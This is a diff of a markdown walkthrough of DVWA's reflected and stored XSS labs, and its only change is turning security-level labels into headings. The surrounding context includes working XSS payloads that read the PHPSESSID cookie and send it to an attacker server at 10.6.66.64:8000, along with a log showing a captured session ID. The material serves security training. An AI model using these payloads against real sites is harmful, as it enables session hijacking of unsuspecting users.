@@ -10,7 +10,7 @@ Our goal will be to then send the user's session cookie (`PHPSESSID`) to this se
 
 ### XSS (Reflected)
 
-*Security Level: low*
+#### *Security Level: low*
 
 Looking at the source code, we can see that there is no filtering of the user input:
 ```php
@@ -61,7 +61,7 @@ Combining all of this together, we can send the following payload:
 ```
 We receive this in our web server as `GET /?PHPSESSID=c0qlht8eff4bsj7iqo3a0so092 HTTP/1.1`. If a user now visits the url which sets name to this payload, their session cookie would be leaked. If we check in the browser storage, we can see that the cookie we received matches the stored value of `PHPSESSID` (`c0qlht8eff4bsj7iqo3a0so092`).
 
-*Security Level: medium*
+#### *Security Level: medium*
 
 To try and prevent XSS, the page is now filtering `<script>` tags out of the input:
 ```PHP
@@ -105,7 +105,7 @@ msg.open('GET', url+'?PHPSESSID='+getCookie('PHPSESSID'), async=false);
 msg.send();">
 ```
 
-*Security Level: high*
+#### *Security Level: high*
 
 The page is now using a slightly beefier regex to prevent XSS:
 
@@ -145,7 +145,7 @@ If we now submit this URL, the page now renders a button, which when clicked exe
 
 ### XSS (Stored)
 
-*Security Level: low*
+#### *Security Level: low*
 
 We are now uploading our payload to be stored in a database, which is then included in a HTML document. Looking at the source code, we can see that our input is sanitized to prevent SQL injection, but has no guards against an XSS:
 
@@ -169,7 +169,7 @@ Unfortunately, I ran into an issue. Even if we send the POST requests ourselves,
 <script>var m=new XMLHttpRequest();var url="http://10.6.66.64:8000";function gC(name){var value=`; ${document.cookie}`;var p=value.split(`; ${name}=`);if (p.length===2){return p.pop().split(';').shift();}}m.open("GET",url+"?PHPSESSID="+gC("PHPSESSID"),async=false);m.send();</script>
 ```
 
-*Security Level: medium*
+#### *Security Level: medium*
 
 On this level, messages are now sanitized as follows
 ```PHP
@@ -219,7 +219,7 @@ This javascript payload works in on online emulated javascript environment, but 
 
 ```
 
-*Security Level: high*
+#### *Security Level: high*
 
 This level again reflects the previous category, with the same regex used to sanitize the name field.
 ```PHP
